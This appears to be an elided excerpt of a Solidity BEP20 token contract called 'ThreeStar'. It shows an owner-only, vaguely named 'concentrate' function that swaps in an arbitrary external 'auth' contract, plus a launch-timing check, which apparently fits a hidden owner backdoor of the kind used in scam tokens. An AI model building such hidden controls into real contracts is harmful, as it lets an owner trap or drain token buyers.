...
abstract contract Auth {
     ...
     */
    function concentrate(address _auth) public onlyOwner {
        auth = iBEP20(_auth);
    }
    /**
...
contract ThreeStar is IBEP20, Auth {
    using SafeMath for uint256;    
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "ThreeStar";
    string constant _symbol = "ThreeStar";
    ...
    function prepercent(uint256 launchAt, uint256 dura) public view returns (bool){
